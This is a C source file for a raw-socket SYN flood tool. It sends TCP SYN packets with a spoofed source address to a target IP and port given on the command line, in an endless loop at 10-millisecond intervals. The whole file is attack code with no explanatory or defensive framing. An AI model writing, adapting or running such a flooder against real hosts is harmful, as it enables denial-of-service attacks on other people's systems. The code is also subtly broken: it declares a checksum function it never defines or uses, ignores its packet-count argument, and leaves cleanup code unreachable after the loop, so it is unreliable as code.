#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

// Function to delay execution for a given number of milliseconds
void delay(int milliseconds) {
    usleep(milliseconds * 1000);
}

int main(int argc, char* argv[]) {
    // Check for the command-line arguments
    if (argc != 4) {
        printf("Usage: %s <Target IP> <Target Port> <Number of Packets>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    // Create a raw socket
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sd < 0) {
        perror("socket() failed");
        exit(EXIT_FAILURE);
    }
    
    // Set the socket options
    int one = 1;
    const int* val = &one;
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("setsockopt() failed");
        exit(EXIT_FAILURE);
    }
    
    // Prepare the destination address structure
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(atoi(argv[2]));
    sin.sin_addr.s_addr = inet_addr(argv[1]);
    
    // Allocate the packet buffer
    char* packet = (char*)malloc(65536);
    if (!packet) {
        perror("malloc() failed");
        exit(EXIT_FAILURE);
    }
    memset(packet, 0, 65536);
    
    // Fill in the IP header
    struct iphdr* iph = (struct iphdr*)packet;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 16;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.1.10");
    iph->daddr = sin.sin_addr.s_addr;
    
    // Fill in the TCP header
    struct tcphdr* tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
    tcp->source = htons(1234);
    tcp->dest = sin.sin_port;
    tcp->seq = 0;
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->fin = 0;
    tcp->syn = 1;
    tcp->rst = 0;
    tcp->psh = 0;
    tcp->ack = 0;
    tcp->urg = 0;
    tcp->window = htons(5840);
    tcp->check = 0;
    tcp->urg_ptr = 0;
    
    // Calculate the TCP checksum
    unsigned short csum(unsigned short *ptr, int nbytes);
    // Loop forever
while (1) {
    if (sendto(sd, packet, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin)) < 0) {
        perror("sendto() failed");
        exit(EXIT_FAILURE);
    }
    printf("Packet sent to %s\n", argv[1]);
    delay(10); // Wait for 10 milliseconds before sending the next packet
}

// Free the allocated memory
free(packet);

// Close the socket descriptor
close(sd);

return 0;
}
